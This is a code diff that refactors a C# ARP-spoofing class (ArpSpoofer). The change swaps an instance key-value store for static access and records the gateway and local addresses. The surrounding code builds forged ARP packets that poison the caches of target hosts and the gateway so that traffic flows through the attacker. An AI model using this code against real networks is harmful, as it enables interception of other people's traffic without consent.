@@ -26,8 +26,7 @@ namespace Sentro.ARP
         public const string Tag = "ArpSpoofer";
         private static ArpSpoofer _arpSpoofer;        
         private HashSet<string> _excludedTargets;        
-        private string _myIp, _myMac, _gatewayIp, _gatewayMac;
-        private KvStore _kvStore;       
+        private string _myIp, _myMac, _gatewayIp, _gatewayMac;          
 
         /*packet builders grouped here to avoid creating a new builder with each packet sent*/
         private Dictionary<string, PacketBuilder> _targetsPacketBuilders;
@@ -44,8 +43,7 @@ namespace Sentro.ARP
         {                        
             _excludedTargets = new HashSet<string>();
             _targetsPacketBuilders = new Dictionary<string, PacketBuilder>();
-            _gatewayPacketBuilders = new Dictionary<string, PacketBuilder>();
-            _kvStore = KvStore.GetInstance();
+            _gatewayPacketBuilders = new Dictionary<string, PacketBuilder>();            
         }
 
         public static ArpSpoofer GetInstance()
@@ -56,21 +54,21 @@ namespace Sentro.ARP
         private void InsertAllStaticMacAddresses(NetworkInterface networkInterface)
         {                                
             NetworkUtilites.InsertStaticMac(networkInterface, _gatewayIp, _gatewayMac);
-            foreach (var t in _kvStore.TargetIps)
-                NetworkUtilites.InsertStaticMac(networkInterface, t, _kvStore.IpMac[t]);
+            foreach (var t in KvStore.TargetIps)
+                NetworkUtilites.InsertStaticMac(networkInterface, t, KvStore.IpMac[t]);
         }
 
         private void DeleteAllStaticMacAddresses(NetworkInterface networkInterface)
         {            
             NetworkUtilites.DeleteStaticMac(networkInterface, _gatewayIp);
-            foreach (var t in _kvStore.TargetIps)
+            foreach (var t in KvStore.TargetIps)
                 NetworkUtilites.DeleteStaticMac(networkInterface, t);
 
         }
 
         private void SpoofAllFakeAddresses(NetworkInterface networkInterface, PacketCommunicator communicator)
         {                        
-            foreach (string target in _kvStore.TargetIps)
+            foreach (string target in KvStore.TargetIps)
             {
                 if (MakeSureTargetIsReadyToBeAttacked(networkInterface, target) == false)
                     continue;
@@ -89,7 +87,7 @@ namespace Sentro.ARP
 
         private void SpoofRealAddresses(PacketCommunicator communicator)
         {            
-            foreach (string target in _kvStore.TargetIps)
+            foreach (string target in KvStore.TargetIps)
             {                
                 SpoofGatewayFinalRequest(communicator, target);
                 SpoofTargetFinalRequest(communicator, target);
@@ -107,7 +105,7 @@ namespace Sentro.ARP
             Task.Run(() =>
             {
                 /*convert to array so that adding a new ip will not affect the for loop*/
-                string[] targetsArray = _kvStore.TargetIps.ToArray();                
+                string[] targetsArray = KvStore.TargetIps.ToArray();                
                 _status = Status.Started;
                 while (_status == Status.Started || _status == Status.Starting || _status == Status.Paused)
                 {
@@ -118,7 +116,7 @@ namespace Sentro.ARP
                     }
 
                     if (_targetsChanged)
-                        targetsArray = _kvStore.TargetIps.ToArray();
+                        targetsArray = KvStore.TargetIps.ToArray();
 
                     foreach (string target in targetsArray)
                     {                        
@@ -145,17 +143,20 @@ namespace Sentro.ARP
                         
             _status = Status.Starting;            
 
-            var livePacketDevice = NetworkUtilites.GetLivePacketDevice(myIp);                       
-            
-            _kvStore.TargetIps = targets;
+            var livePacketDevice = NetworkUtilites.GetLivePacketDevice(myIp);
+
+            KvStore.TargetIps.UnionWith(targets);
             _myIp = myIp;
             _myMac = livePacketDevice.GetMacAddress().ToString();
             _gatewayIp = NetworkUtilites.GetGatewayIp(livePacketDevice);
             _gatewayMac = NetworkUtilites.GetMacAddress(_gatewayIp);
 
+            KvStore.IpMac.Add(_myIp,_myMac);
+            KvStore.IpMac.Add(_gatewayIp,_gatewayMac);
+
             /*targets rarely change their mac address, also this function considerd costly*/                        
             foreach (var ip in targets)
-                _kvStore.IpMac.Add(ip, NetworkUtilites.GetMacAddress(ip));
+                KvStore.IpMac.Add(ip, NetworkUtilites.GetMacAddress(ip));
 
             var networkInterface = livePacketDevice.GetNetworkInterface();                                  
         
@@ -224,7 +225,7 @@ namespace Sentro.ARP
                     var packet = new PacketBuilder(ether, arplayer).Build(DateTime.Now);
                     communicator.SendPacket(packet);
                 }
-                else if (_kvStore.IpMac.ContainsKey(sourceIp))
+                else if (KvStore.IpMac.ContainsKey(sourceIp))
                 {
                     SpoofGateway(communicator, sourceIp);
                 }
@@ -265,7 +266,7 @@ namespace Sentro.ARP
                 var ether = new EthernetLayer
                 {
                     Source = new MacAddress(_myMac),
-                    Destination = new MacAddress(_kvStore.IpMac[targetIp]),
+                    Destination = new MacAddress(KvStore.IpMac[targetIp]),
                     EtherType = EthernetType.None,
                 };
                 var arp = new ArpLayer
@@ -322,7 +323,7 @@ namespace Sentro.ARP
                     var ether = new EthernetLayer
                     {
                         Source = new MacAddress(_myMac),
-                        Destination = new MacAddress(_kvStore.IpMac[targetIp]),
+                        Destination = new MacAddress(KvStore.IpMac[targetIp]),
                         EtherType = EthernetType.None,
                     };
                     var arp = new ArpLayer
@@ -358,7 +359,7 @@ namespace Sentro.ARP
                 {
                     ProtocolType = EthernetType.IpV4,
                     Operation = ArpOperation.Request,
-                    SenderHardwareAddress = new MacAddress(_kvStore.IpMac[targetIp]).ToBytes(),
+                    SenderHardwareAddress = new MacAddress(KvStore.IpMac[targetIp]).ToBytes(),
                     SenderProtocolAddress = new IpV4Address(targetIp).ToBytes(),
                     TargetHardwareAddress = MacAddress.Zero.ToBytes(),
                     TargetProtocolAddress = new IpV4Address(_gatewayIp).ToBytes()
@@ -376,7 +377,7 @@ namespace Sentro.ARP
                 var ether = new EthernetLayer
                 {
                     Source = new MacAddress(_myMac),
-                    Destination = new MacAddress(_kvStore.IpMac[targetIp]),
+                    Destination = new MacAddress(KvStore.IpMac[targetIp]),
                     EtherType = EthernetType.None,
                 };
                 var arp = new ArpLayer
@@ -395,14 +396,14 @@ namespace Sentro.ARP
 
         private bool MakeSureTargetIsReadyToBeAttacked(NetworkInterface networkInterface, string target)
         {
-            if (!_kvStore.IpMac[target].IsNullOrEmpty()) return true;
+            if (!KvStore.IpMac[target].IsNullOrEmpty()) return true;
 
             var mac = NetworkUtilites.GetMacAddress(target);
             if (mac.Length <= 0)
                 return false;
 
-            _kvStore.IpMac[target] = mac;
-            NetworkUtilites.InsertStaticMac(networkInterface, target, _kvStore.IpMac[target]);
+            KvStore.IpMac[target] = mac;
+            NetworkUtilites.InsertStaticMac(networkInterface, target, KvStore.IpMac[target]);
             return true;
         }
 
@@ -413,26 +414,26 @@ namespace Sentro.ARP
 
         public void Include(string target)
         {
-            _kvStore.TargetIps.Add(target);
+            KvStore.TargetIps.Add(target);
             _targetsChanged = true;
         }
 
         public void Include(HashSet<string> targets)
         {
-            _kvStore.TargetIps.UnionWith(targets);
+            KvStore.TargetIps.UnionWith(targets);
             _targetsChanged = true;
         }
 
         public void Exclude(string target)
         {
-            _kvStore.TargetIps.Remove(target);
+            KvStore.TargetIps.Remove(target);
             _excludedTargets.Add(target);
             _targetsChanged = true;                                
         }
 
         public void Exclude(HashSet<string> targets)
         {
-            _kvStore.TargetIps.ExceptWith(targets);
+            KvStore.TargetIps.ExceptWith(targets);
             _excludedTargets.UnionWith(targets);
             _targetsChanged = true;
         }
